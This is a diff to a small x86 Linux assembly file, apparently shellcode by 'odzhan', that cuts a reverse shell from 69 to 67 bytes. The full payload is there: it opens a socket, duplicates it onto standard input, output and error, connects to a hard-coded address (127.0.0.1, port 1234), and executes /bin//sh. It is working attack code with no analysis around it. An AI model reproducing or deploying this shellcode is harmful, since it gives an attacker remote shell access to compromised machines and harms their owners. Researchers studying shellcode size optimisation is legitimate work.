@@ -28,26 +28,17 @@
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;    
 
-; 69 byte reverse shell for linux/x86
+; 67 byte reverse shell for linux/x86
 ; odzhan
 
     bits 32
-    
-    ; setup sock_addr
-    mov    eax, ~0x0100007f & 0xFFFFFFFF 
-    mov    edx, ~0xD2040002 & 0xFFFFFFFF 
-    not    eax
-    not    edx
-    push   eax
-    push   edx
-    mov    ebp, esp
     
     ; step 1, create a socket
     ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);    
     xor    ebx, ebx          ; ebx=0
     mul    ebx               ; eax=0, edx=0
-    mov    al, 0x66          ; eax      = sys_socketcall
-    inc    ebx               ; ebx      = sys_socket
+    mov    al, 0x66          ; eax      = SYS_socketcall
+    inc    ebx               ; ebx      = SYS_socket
     push   edx               ; protocol = IPPROTO_IP
     push   ebx               ; type     = SOCK_STREAM
     push   2                 ; family   = AF_INET
@@ -61,31 +52,33 @@
     ; dup2 (s, STDOUT_FILENO)
     ; dup2 (s, STDERR_FILENO)    
     pop    ecx               ; ecx=2
-dup_loop:
-    mov    al, 0x3f          ; eax=sys_dup2
+c_dup:
+    mov    al, 0x3f          ; eax=SYS_dup2
     int    0x80 
     dec    ecx
-    jns    dup_loop          ; jump if not signed
-    
-    mov    ecx, ebp          ; ecx=&sa
-    mov    al, 0x66          ; eax=sys_socketcall
+    jns    c_dup             ; while (ecx >= 0)
     
     ; step 3, connect to remote host
-    ; connect (s, &sa, sizeof(sa));    
-    push   0x10              ; sizeof(sa)
+    ; connect (s, &sa, sizeof(sa));   
+    push   0x0100007f        ; 127.0.0.1
+    push   0xD2040002        ; 1234, AF_INET
+    mov    ecx, esp
+    
+    mov    al, 0x66          ; eax=SYS_socketcall    
+    push   eax               ; sizeof(sa)
     push   ecx               ; &sa
     push   ebx               ; sockfd
     mov    ecx, esp          ; &args
     push   3
-    pop    ebx               ; ebx=sys_connect
+    pop    ebx               ; ebx=SYS_connect
     int    0x80
     
     ; step 4, execute /bin/sh
-    ; execv("/bin//sh", NULL, NULL);    
-    mov    al, 0xb           ; eax=sys_execve
+    ; execve("/bin//sh", NULL, NULL);    
+    mov    al, 0xb           ; eax=SYS_execve
     push   edx               ; '\0'
     push   '//sh'            ; 
     push   '/bin'            ; 
     mov    ebx, esp          ; ebx="/bin//sh", 0
     xor    ecx, ecx          ; ecx=0 argv=0
-    int    0x80              ; exec sys_execve
+    int    0x80              ; exec SYS_execve
